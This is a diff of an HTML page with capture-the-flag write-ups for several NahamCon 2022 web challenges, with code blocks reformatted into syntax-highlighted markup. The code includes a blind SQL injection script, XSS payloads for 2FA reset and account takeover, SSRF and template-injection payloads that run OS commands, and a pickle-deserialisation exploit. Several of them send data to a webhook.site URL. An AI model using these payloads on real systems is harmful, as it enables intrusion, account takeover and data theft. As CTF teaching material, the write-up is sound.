@@ -4,6 +4,7 @@
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
 		<link rel="stylesheet" href="/assets/css/main.css" />
+		<link rel="stylesheet" href="/assets/css/main.css" />
 		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
 	</head>
 	<body class="is-preload">
@@ -43,7 +44,7 @@
 		    </section>
 
       <section id="wrapper">
-<section class="wrapper style6 ">
+<section class="wrapper style1 ">
 <div class="inner">
 <div class="content">
 <h1 class="major">
@@ -134,7 +135,7 @@
 </div>
 </div>
 </section>
-<section class="wrapper style4 alt">
+<section class="wrapper style3 alt">
 <div class="inner">
 <div class="content">
 
@@ -144,7 +145,7 @@
 </div>
 </div>
 </section>
-<section class="wrapper style3 ">
+<section class="wrapper style5 ">
 <div class="inner">
 <div class="content">
 
@@ -271,26 +272,28 @@
   src/app.py
  </code>
 </p>
-<pre class="codehilite"><code class="language-python">@app.route("/", methods=["GET", "POST"])
-def index():
-    if request.method == "POST":
-        search = ""
-        order = None
-        if "search" in request.form:
-            search = request.form["search"]
-        if "order" in request.form:
-            order = request.form["order"]
-        if order is None:
-            metals = Metal.query.filter(Metal.name.like("%{}%".format(search)))
-        else:
-            metals = Metal.query.filter(
-                Metal.name.like("%{}%".format(search))
-            ).order_by(text(order))
-        return render_template("home.html", metals=metals)
-    else:
-        metals = Metal.query.all()
-        return render_template("home.html", metals=metals)
+<div class="codehilite">
+ <pre><span></span><code><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">"GET"</span><span class="p">,</span> <span class="s2">"POST"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"POST"</span><span class="p">:</span>
+        <span class="n">search</span> <span class="o">=</span> <span class="s2">""</span>
+        <span class="n">order</span> <span class="o">=</span> <span class="kc">None</span>
+        <span class="k">if</span> <span class="s2">"search"</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">:</span>
+            <span class="n">search</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">"search"</span><span class="p">]</span>
+        <span class="k">if</span> <span class="s2">"order"</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">:</span>
+            <span class="n">order</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">"order"</span><span class="p">]</span>
+        <span class="k">if</span> <span class="n">order</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="n">metals</span> <span class="o">=</span> <span class="n">Metal</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span><span class="n">Metal</span><span class="o">.</span><span class="n">name</span><span class="o">.</span><span class="n">like</span><span class="p">(</span><span class="s2">"%</span><span class="si">{}</span><span class="s2">%"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">search</span><span class="p">)))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">metals</span> <span class="o">=</span> <span class="n">Metal</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span>
+                <span class="n">Metal</span><span class="o">.</span><span class="n">name</span><span class="o">.</span><span class="n">like</span><span class="p">(</span><span class="s2">"%</span><span class="si">{}</span><span class="s2">%"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">search</span><span class="p">))</span>
+            <span class="p">)</span><span class="o">.</span><span class="n">order_by</span><span class="p">(</span><span class="n">text</span><span class="p">(</span><span class="n">order</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">"home.html"</span><span class="p">,</span> <span class="n">metals</span><span class="o">=</span><span class="n">metals</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">metals</span> <span class="o">=</span> <span class="n">Metal</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">all</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">"home.html"</span><span class="p">,</span> <span class="n">metals</span><span class="o">=</span><span class="n">metals</span><span class="p">)</span>
 </code></pre>
+</div>
 <p>
  So how do we exploit the
  <code>
@@ -388,8 +391,10 @@ def index():
  </code>
  I constructed the following blind SQL injection payload.
 </p>
-<pre class="codehilite"><code class="language-sql">1 LIMIT 0, 1|1000*(SELECT instr(flag, '{chars}') FROM flag)
+<div class="codehilite">
+ <pre><span></span><code><span class="mi">1</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="o">|</span><span class="mi">1000</span><span class="o">*</span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">instr</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="w"> </span><span class="s1">'{chars}'</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span><span class="p">)</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  How this works is when I find the next character in the flag, the upper
  <code>
@@ -412,56 +417,58 @@ def index():
 <p>
  Putting it all together, below is the dirty solution code that I wrote.
 </p>
-<pre class="codehilite"><code class="language-python">import requests, threading, queue, string
-import urllib.parse as url_parse
+<div class="codehilite">
+ <pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">threading</span><span class="o">,</span> <span class="nn">queue</span><span class="o">,</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span> <span class="k">as</span> <span class="nn">url_parse</span>
 
-QUERY = "1 LIMIT 0, 1|1000*(SELECT instr(flag, '{chars}') FROM flag)"
-THREADS = 20
-TARGET = "&lt;URL TO YOUR CHALLENGE INSTANCE&gt;"
+<span class="n">QUERY</span> <span class="o">=</span> <span class="s2">"1 LIMIT 0, 1|1000*(SELECT instr(flag, '</span><span class="si">{chars}</span><span class="s2">') FROM flag)"</span>
+<span class="n">THREADS</span> <span class="o">=</span> <span class="mi">20</span>
+<span class="n">TARGET</span> <span class="o">=</span> <span class="s2">"&lt;URL TO YOUR CHALLENGE INSTANCE&gt;"</span>
 
-PREFIX = "flag{"
-CHARS = "_" + string.ascii_lowercase + string.digits + string.ascii_uppercase + "}"
+<span class="n">PREFIX</span> <span class="o">=</span> <span class="s2">"flag{"</span>
+<span class="n">CHARS</span> <span class="o">=</span> <span class="s2">"_"</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="s2">"}"</span>
 
-q = queue.Queue()
-result_q = queue.Queue()
+<span class="n">q</span> <span class="o">=</span> <span class="n">queue</span><span class="o">.</span><span class="n">Queue</span><span class="p">()</span>
+<span class="n">result_q</span> <span class="o">=</span> <span class="n">queue</span><span class="o">.</span><span class="n">Queue</span><span class="p">()</span>
 
-def worker():
-    while True:
-        chars = q.get()[0]
-        if chars == None:
-            break
-        query = QUERY.format(
-            chars=chars
-        )
-        r = requests.post(TARGET,data={"search":"","order":query})
+<span class="k">def</span> <span class="nf">worker</span><span class="p">():</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">chars</span> <span class="o">=</span> <span class="n">q</span><span class="o">.</span><span class="n">get</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">if</span> <span class="n">chars</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="k">break</span>
+        <span class="n">query</span> <span class="o">=</span> <span class="n">QUERY</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+            <span class="n">chars</span><span class="o">=</span><span class="n">chars</span>
+        <span class="p">)</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">"search"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="s2">"order"</span><span class="p">:</span><span class="n">query</span><span class="p">})</span>
 
-        if len(r.content) &gt; 3480:
-            result_q.put((chars,))
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">3480</span><span class="p">:</span>
+            <span class="n">result_q</span><span class="o">.</span><span class="n">put</span><span class="p">((</span><span class="n">chars</span><span class="p">,))</span>
 
-        q.task_done()
+        <span class="n">q</span><span class="o">.</span><span class="n">task_done</span><span class="p">()</span>
 
 
-if __name__ == "__main__":
-    for c in CHARS:
-        q.put((PREFIX+c,))
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">CHARS</span><span class="p">:</span>
+        <span class="n">q</span><span class="o">.</span><span class="n">put</span><span class="p">((</span><span class="n">PREFIX</span><span class="o">+</span><span class="n">c</span><span class="p">,))</span>
 
-    threads = [
-        threading.Thread(target=worker, daemon=True)
-            for _t in range(THREADS)
-    ]
+    <span class="n">threads</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">worker</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">_t</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">THREADS</span><span class="p">)</span>
+    <span class="p">]</span>
 
-    t: threading.Thread
-    [t.start() for t in threads]
+    <span class="n">t</span><span class="p">:</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span>
+    <span class="p">[</span><span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span> <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">]</span>
 
-    while True:
-        found_chars: str = result_q.get()[0]
-        print("FOUND CHARS:", found_chars)
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">found_chars</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="n">result_q</span><span class="o">.</span><span class="n">get</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"FOUND CHARS:"</span><span class="p">,</span> <span class="n">found_chars</span><span class="p">)</span>
 
-        for c in CHARS:
-            q.put((found_chars+c,))
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">CHARS</span><span class="p">:</span>
+            <span class="n">q</span><span class="o">.</span><span class="n">put</span><span class="p">((</span><span class="n">found_chars</span><span class="o">+</span><span class="n">c</span><span class="p">,))</span>
 
-        result_q.task_done()
+        <span class="n">result_q</span><span class="o">.</span><span class="n">task_done</span><span class="p">()</span>
 </code></pre>
+</div>
 <p>
  Executing the code above will leak the flag character by character as shown below.
 </p>
@@ -471,7 +478,7 @@ if __name__ == "__main__":
 </div>
 </div>
 </section>
-<section class="wrapper style2 alt">
+<section class="wrapper style4 alt">
 <div class="inner">
 <div class="content">
 
@@ -582,8 +589,10 @@ if __name__ == "__main__":
  </code>
  for sending exfiltrated data to my web hook again. My first payload resets the victim's 2FA and sends the response to my webhook I can save the OTP key on my 2FA authenticator app.
 </p>
-<pre class="codehilite"><code class="language-html">&lt;script&gt;fetch("/reset2fa",{method:'post'}).then(r =&gt; r.text()).then((d) =&gt; {fetch("https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?otp="+btoa(d))});&lt;/script&gt;
+<div class="codehilite">
+ <pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s2">"/reset2fa"</span><span class="p">,{</span><span class="nx">method</span><span class="o">:</span><span class="s1">'post'</span><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">((</span><span class="nx">d</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="nx">fetch</span><span class="p">(</span><span class="s2">"https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?otp="</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">d</span><span class="p">))});&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/nahamcon-2022/twoforone_otp.png"/>
 </p>
@@ -620,8 +629,10 @@ if __name__ == "__main__":
  </code>
  .
 </p>
-<pre class="codehilite"><code class="language-html">&lt;script&gt;fetch("/reset_password",{method:'post',headers:{'Content-Type':'application/json'},body:JSON.stringify({"password":"getyaaccounttakenoverlol","password2":"getyaaccounttakenoverlol","otp":"&lt;PUT OTP HERE&gt;"})});&lt;/script&gt;
+<div class="codehilite">
+ <pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s2">"/reset_password"</span><span class="p">,{</span><span class="nx">method</span><span class="o">:</span><span class="s1">'post'</span><span class="p">,</span><span class="nx">headers</span><span class="o">:</span><span class="p">{</span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="s1">'application/json'</span><span class="p">},</span><span class="nx">body</span><span class="o">:</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="s2">"password"</span><span class="o">:</span><span class="s2">"getyaaccounttakenoverlol"</span><span class="p">,</span><span class="s2">"password2"</span><span class="o">:</span><span class="s2">"getyaaccounttakenoverlol"</span><span class="p">,</span><span class="s2">"otp"</span><span class="o">:</span><span class="s2">"&lt;PUT OTP HERE&gt;"</span><span class="p">})});&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre>
+</div>
 <p>
  After waiting until the payload has been executed, I was able to login to the
  <code>
@@ -635,7 +646,7 @@ if __name__ == "__main__":
 </div>
 </div>
 </section>
-<section class="wrapper style1 ">
+<section class="wrapper style6 ">
 <div class="inner">
 <div class="content">
 
@@ -694,8 +705,10 @@ if __name__ == "__main__":
 <p>
  One method to check if it is vulnerable to SSRF is by seeing if you can execute Javascript code when the image of the t-shirt is generated. The payload below should overwrite the contents the document and would show on the generated image.
 </p>
-<pre class="codehilite"><code class="language-html">&lt;script&gt;document.write("noice nearly SSRF!");&lt;/script&gt;
+<div class="codehilite">
+ <pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">"noice nearly SSRF!"</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre>
+</div>
 <p>
  The first input to test would be the
  <code>
@@ -747,8 +760,10 @@ if __name__ == "__main__":
   </code>
  </strong>
 </p>
-<pre class="codehilite"><code class="language-html">&lt;script&gt;fetch("https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?type=fetch");&lt;/script&gt;
+<div class="codehilite">
+ <pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s2">"https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?type=fetch"</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre>
+</div>
 <p>
  <strong>
   Testing
@@ -757,8 +772,10 @@ if __name__ == "__main__":
   </code>
  </strong>
 </p>
-<pre class="codehilite"><code class="language-html">&lt;script&gt;x=new XMLHttpRequest();x.open('GET','https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?type=ohgoditsxmlhttprequest');x.send()&lt;/script&gt;
+<div class="codehilite">
+ <pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">x</span><span class="o">=</span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="nx">x</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?type=ohgoditsxmlhttprequest'</span><span class="p">);</span><span class="nx">x</span><span class="p">.</span><span class="nx">send</span><span class="p">()&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre>
+</div>
 <p>
  Unfortunately, only
  <code>
@@ -784,8 +801,10 @@ if __name__ == "__main__":
  </code>
  text to my webhook using the following payload.
 </p>
-<pre class="codehilite"><code class="language-html">&lt;script&gt;x=new XMLHttpRequest();x.onload=function(){y=new XMLHttpRequest();y.open('GET','https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?yeet'+btoa(x.responseText));y.send()};x.open('GET','http://localhost:5000/admin');x.send();&lt;/script&gt;
+<div class="codehilite">
+ <pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">x</span><span class="o">=</span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="nx">x</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="nx">y</span><span class="o">=</span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="nx">y</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?yeet'</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">responseText</span><span class="p">));</span><span class="nx">y</span><span class="p">.</span><span class="nx">send</span><span class="p">()};</span><span class="nx">x</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'http://localhost:5000/admin'</span><span class="p">);</span><span class="nx">x</span><span class="p">.</span><span class="nx">send</span><span class="p">();&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_goof.png"/>
 </p>
@@ -805,8 +824,10 @@ if __name__ == "__main__":
 <p>
  The issue with the above payload is the following part of the payload.
 </p>
-<pre class="codehilite"><code class="language-js">y.open('GET','https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?yeet'+btoa(x.responseText))
+<div class="codehilite">
+ <pre><span></span><code><span class="nx">y</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?yeet'</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">responseText</span><span class="p">))</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  The character
  <code>
@@ -830,8 +851,10 @@ if __name__ == "__main__":
  </code>
  fixes the problem and the following payload works!
 </p>
-<pre class="codehilite"><code>&lt;script&gt;x=new XMLHttpRequest();x.onload=function(){y=new XMLHttpRequest();y.open('GET','https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?yeet'%2Bbtoa(x.responseText));y.send()};x.open('GET','http://localhost:5000/admin');x.send();&lt;/script&gt;
+<div class="codehilite">
+ <pre><span></span><code><span class="nt">&lt;script&gt;</span>x=new XMLHttpRequest();x.onload=function(){y=new XMLHttpRequest();y.open('GET','https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?yeet'%2Bbtoa(x.responseText));y.send()};x.open('GET','http://localhost:5000/admin');x.send();<span class="nt">&lt;/script&gt;</span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/nahamcon-2022/hackerts_noice.png"/>
 </p>
@@ -851,7 +874,7 @@ if __name__ == "__main__":
 </div>
 </div>
 </section>
-<section class="wrapper style5 alt">
+<section class="wrapper style2 alt">
 <div class="inner">
 <div class="content">
 
@@ -925,8 +948,10 @@ if __name__ == "__main__":
  </a>
  .
 </p>
-<pre class="codehilite"><code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}@yeet.com
+<div class="codehilite">
+ <pre><span></span><code><span class="cp">{{</span><span class="nv">self._TemplateReference__context.cycler.__init__.__globals__.os.popen</span><span class="o">(</span><span class="s1">'id'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span><span class="x">@yeet.com</span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_thingswentsouth.png"/>
 </p>
@@ -946,8 +971,10 @@ if __name__ == "__main__":
  </code>
  without being caught by the web application filter (WAF).
 </p>
-<pre class="codehilite"><code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen}}@yeet.com
+<div class="codehilite">
+ <pre><span></span><code><span class="cp">{{</span><span class="nv">self._TemplateReference__context.cycler.__init__.__globals__.os.popen</span><span class="cp">}}</span><span class="x">@yeet.com</span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_icantastetheflag.png"/>
 </p>
@@ -998,8 +1025,10 @@ if __name__ == "__main__":
 <p>
  Testing it with the following payload shows that I have got it!
 </p>
-<pre class="codehilite"><code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen⁽'id'⁾.read⁽⁾}}@yeet.com
+<div class="codehilite">
+ <pre><span></span><code><span class="cp">{{</span><span class="nv">self._TemplateReference__context.cycler.__init__.__globals__.os.popen</span><span class="err">⁽</span><span class="s1">'id'</span><span class="err">⁾</span><span class="nv">.read</span><span class="err">⁽⁾</span><span class="cp">}}</span><span class="x">@yeet.com</span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_heckye.png"/>
 </p>
@@ -1032,8 +1061,10 @@ if __name__ == "__main__":
   Full payload
  </strong>
 </p>
-<pre class="codehilite"><code>/ticket?name=yeet&amp;email={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen⁽request.args.cmd⁾.read⁽⁾}}@yeet.com&amp;cmd=cat flag.txt
+<div class="codehilite">
+ <pre><span></span><code><span class="x">/ticket?name=yeet&amp;email=</span><span class="cp">{{</span><span class="nv">self._TemplateReference__context.cycler.__init__.__globals__.os.popen</span><span class="err">⁽</span><span class="nv">request.args.cmd</span><span class="err">⁾</span><span class="nv">.read</span><span class="err">⁽⁾</span><span class="cp">}}</span><span class="x">@yeet.com&amp;cmd=cat flag.txt</span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/nahamcon-2022/deafcon_flag.png"/>
 </p>
@@ -1202,28 +1233,30 @@ if __name__ == "__main__":
   </code>
  </strong>
 </p>
-<pre class="codehilite"><code class="language-python">import pickle
-import base64, zlib
+<div class="codehilite">
+ <pre><span></span><code><span class="kn">import</span> <span class="nn">pickle</span>
+<span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">zlib</span>
 
-TOKEN = ".eJxNjDsKwkAURbWwFMFVaDPMNy-l2LuG8Oa9GeOHBPIpBRcw5bgOt6iiQm55zuHeF4_n7Ltb3qRlheNQV2MfuurEOc1NTusJ80iX0LzFls_YHFtBbTN0Jy8-ifjZXhxaDtf9v11NDmrs65x2qgRTKJKWoADHDoL3OloVWYEMkZCwYI4E2pQlWKektqw1OkUmQpR5FC_xSj8w:1nkMcd:K4s7fhjnjSn2ix1AIyVKOg728TpKEIO5C0Te4PBIddE"
+<span class="n">TOKEN</span> <span class="o">=</span> <span class="s2">".eJxNjDsKwkAURbWwFMFVaDPMNy-l2LuG8Oa9GeOHBPIpBRcw5bgOt6iiQm55zuHeF4_n7Ltb3qRlheNQV2MfuurEOc1NTusJ80iX0LzFls_YHFtBbTN0Jy8-ifjZXhxaDtf9v11NDmrs65x2qgRTKJKWoADHDoL3OloVWYEMkZCwYI4E2pQlWKektqw1OkUmQpR5FC_xSj8w:1nkMcd:K4s7fhjnjSn2ix1AIyVKOg728TpKEIO5C0Te4PBIddE"</span>
 
-def b64_decode(s):
-    pad = b"=" * (len(s) % 4)
-    return base64.urlsafe_b64decode(s + pad)
+<span class="k">def</span> <span class="nf">b64_decode</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">pad</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"="</span> <span class="o">*</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64decode</span><span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="n">pad</span><span class="p">)</span>
 
-value, sig = token.rsplit(':', 1)
+<span class="n">value</span><span class="p">,</span> <span class="n">sig</span> <span class="o">=</span> <span class="n">token</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s1">':'</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
 
-base64d = value.encode()
+<span class="n">base64d</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
 
-decompress = base64d[:1] == b"."
-if decompress:
-    base64d = base64d[1:]
-data = b64_decode(base64d)
-if decompress:
-    data = zlib.decompress(data)
+<span class="n">decompress</span> <span class="o">=</span> <span class="n">base64d</span><span class="p">[:</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">"."</span>
+<span class="k">if</span> <span class="n">decompress</span><span class="p">:</span>
+    <span class="n">base64d</span> <span class="o">=</span> <span class="n">base64d</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">b64_decode</span><span class="p">(</span><span class="n">base64d</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">decompress</span><span class="p">:</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
 
-print(pickle.loads(data))
+<span class="nb">print</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
 </code></pre>
+</div>
 <p>
  However, I did not find anything besides the standard attributes in Django tokens...
 </p>
@@ -1272,25 +1305,27 @@ print(pickle.loads(data))
   </code>
  </strong>
 </p>
-<pre class="codehilite"><code class="language-python">import os
-from django.core import signing
-from django.contrib.sessions.serializers import PickleSerializer
-import os
+<div class="codehilite">
+ <pre><span></span><code><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">django.core</span> <span class="kn">import</span> <span class="n">signing</span>
+<span class="kn">from</span> <span class="nn">django.contrib.sessions.serializers</span> <span class="kn">import</span> <span class="n">PickleSerializer</span>
+<span class="kn">import</span> <span class="nn">os</span>
 
-SECRET_KEY = "77m6p#v&amp;(wk_s2+n5na-bqe!m)^zu)9typ#0c&amp;@qd%8o6!"
+<span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="s2">"77m6p#v&amp;(wk_s2+n5na-bqe!m)^zu)9typ#0c&amp;@qd</span><span class="si">%8o</span><span class="s2">6!"</span>
 
-class Exploit():
-    def __reduce__(self):
-        return (os.system, ("""wget https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?o=$(cat flag.txt|base64 -w0)""",))
+<span class="k">class</span> <span class="nc">Exploit</span><span class="p">():</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s2">"""wget https://webhook.site/c6db1a4c-adad-4d53-b47e-3eee94940202?o=$(cat flag.txt|base64 -w0)"""</span><span class="p">,))</span>
 
-print(signing.dumps(
-    Exploit(),
-    key=SECRET_KEY,
-    salt='django.contrib.sessions.backends.signed_cookies',
-    serializer=PickleSerializer
-    )
-)
+<span class="nb">print</span><span class="p">(</span><span class="n">signing</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span>
+    <span class="n">Exploit</span><span class="p">(),</span>
+    <span class="n">key</span><span class="o">=</span><span class="n">SECRET_KEY</span><span class="p">,</span>
+    <span class="n">salt</span><span class="o">=</span><span class="s1">'django.contrib.sessions.backends.signed_cookies'</span><span class="p">,</span>
+    <span class="n">serializer</span><span class="o">=</span><span class="n">PickleSerializer</span>
+    <span class="p">)</span>
+<span class="p">)</span>
 </code></pre>
+</div>
 <p>
  Now all I had to do was change my
  <code>
@@ -1307,7 +1342,7 @@ print(signing.dumps(
 </div>
 </div>
 </section>
-<section class="wrapper style2 alt">
+<section class="wrapper style6 alt">
 <div class="inner">
 <div class="content">
 
@@ -1407,49 +1442,51 @@ print(signing.dumps(
   </code>
  </strong>
 </p>
